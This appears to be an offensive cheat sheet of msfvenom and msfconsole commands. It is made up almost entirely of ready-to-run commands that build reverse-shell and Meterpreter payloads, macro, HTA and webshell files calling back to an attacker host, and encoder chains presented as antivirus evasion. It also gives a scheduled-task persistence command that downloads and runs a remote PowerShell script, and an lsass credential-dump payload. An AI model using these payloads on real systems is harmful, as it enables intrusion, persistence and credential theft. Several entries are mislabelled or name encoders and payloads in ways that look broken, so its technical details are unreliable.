# Msfconsole

---

# Basic Commands

```
Payloads Type:
windows/x64/meterpreter/
linux/x64/meterpreter/
php/
java/
python/
aspx/


File Type:
"exe" EXECUTE File
"elf" LINUX Binary File
"psh" POWERSHELL File


```

# Basic Shell

```
LHOST = Attacker HOST
LPORT = Attacker PORT

1. Basic Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o shell.exe

2. x64 Meterpreter HTTPS (AV Bypass)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 -f exe -o update.exe

3. Linux Reverse Shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o webshell.elf

4. PowerShell Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f psh -o shell.ps1

5. Handler Setup
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

# Encoding & Evasion

```
-e x64/zutto_dekiru
-e x64/xor_dynamic -e x64/zutto_dekiru -e x64/shikata_ga_nai
-e x86/shikata_ga_nai

6. Single Encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/shikata_ga_nai -i 3 -f exe -o encoded.exe

7. Multi-Encoder Chain
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/xor -e x64/shikata_ga_nai -i 5 -f exe -o multi_enc.exe

8. Custom Template (AV Bypass)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -x /path/to/legit.exe -f exe -o templated.exe

9. Resource Embedding
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 --addicon /path/to/icon.ico -f exe -o icon.exe

10. Iterations for Detection Evasion
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/shikata_ga_nai -i 10 -f exe -o evasive.exe
```

# File Format Payloads

```
11. HTA Attack
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f hta-psh -o attack.hta

12. Macro-Enabled DOC
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f vba-exe -o macro.vba

13. ASPX Webshell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f aspx -o shell.aspx

14. PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw -o shell.php

15. JSP Webshell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw -o shell.jsp
```

# Network & Pivot

```
16. SOCKS Proxy Pivot
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=8443 -f exe -o pivot.exe

17. Multi-Handler Pivot
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.1 LPORT=80 -f exe -o http_pivot.exe

18. DNS Tunneling
msfvenom -p windows/x64/meterpreter/reverse_dns LHOST=attacker.com LPORT=53 -f exe -o dns_tunnel.exe

19. ICMP Pivot
msfvenom -p windows/x64/meterpreter_reverse_icmp LHOST=10.10.10.1 -f exe -o icmp_pivot.exe

20. SSH Reverse Tunnel Payload
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=9001 -f elf > ssh_payload
```

# AMSI/ETW Bypass

```
21. AMSI Bypass
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f psh-reflection -o amsi_bypass.ps1

22. ETW Patch
msfvenom -p windows/x64/exec CMD="powershell -ep bypass -f amsi.ps1" -f exe -o etw_bypass.exe

23. In-Memory PowerShell
msfvenom -p windows/x64/shellcode_inject/afl_wow64linear LHOST=10.10.10.1 LPORT=4444 -f exe -o inmemory.exe

24. COM Hijacking
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f dll -o comhijack.dll

25. Service Binary
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe-service -o svc.exe
```

# Advanced

```
26. Cobalt Strike Compatible
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 \
   -e x64/zutto_dekiru -i 8 --platform windows -a x64 -f exe-only-payload -o cs_compat.exe

27. Stageless Meterpreter
msfvenom -p windows/x64/meterpreter_bind_tcp LPORT=4444 -f exe -o stageless.exe

28. Userland Persistence
msfvenom -p windows/x64/exec CMD="schtasks /create /tn Evil /tr powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.1/evil.ps1')" -f exe -o persist.exe

29. Lsass Dump Payload
msfvenom -p windows/x64/exec CMD="procdump.exe -ma lsass.exe lsass.dmp" -f exe -o dump.exe

30. C2 Beacon (Sleep Mask)
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.1 LPORT=80 \
   HttpUserAgent="Mozilla/5.0" HttpHostHeader="10.10.10.1" -f exe -o beacon.exe
```


